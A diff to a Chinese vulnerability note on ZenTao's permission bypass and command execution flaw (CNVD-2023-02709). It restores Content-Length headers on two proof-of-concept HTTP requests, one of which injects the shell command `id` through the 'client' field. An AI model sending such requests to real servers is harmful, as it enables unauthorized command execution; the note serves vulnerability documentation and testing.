@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -118,11 +118,12 @@ Referer: http://your-ip:8084/index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPX
 Accept-Encoding: gzip
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5408.146 Safari/537.36
 Content-Type: application/x-www-form-urlencoded
+Content-Length: 154
 
 product%5B%5D=1&SCM=Gitlab&name=poc&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=
 ```
 
-> 请求长度说明：原资料 Content-Length 为 154；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 154；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![](./.resource/禅道-misc-captcha-user.html-权限绕过&命令执行漏洞-CNVD-2023-02709/media/image-20250407102230251.png)
 
@@ -138,11 +139,12 @@ Referer: http://your-ip:8084/index.php?m=user&f=login&referer=L2luZGV4LnBocD9tPX
 X-Requested-With: XMLHttpRequest
 Accept-Encoding: gzip
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5408.146 Safari/537.36
+Content-Length: 112
 
 SCM=Subversion&client=`id`
 ```
 
-> 请求长度说明：原资料 Content-Length 为 112；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 112；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![](./.resource/禅道-misc-captcha-user.html-权限绕过&命令执行漏洞-CNVD-2023-02709/media/image-20250407102450815.png)
 
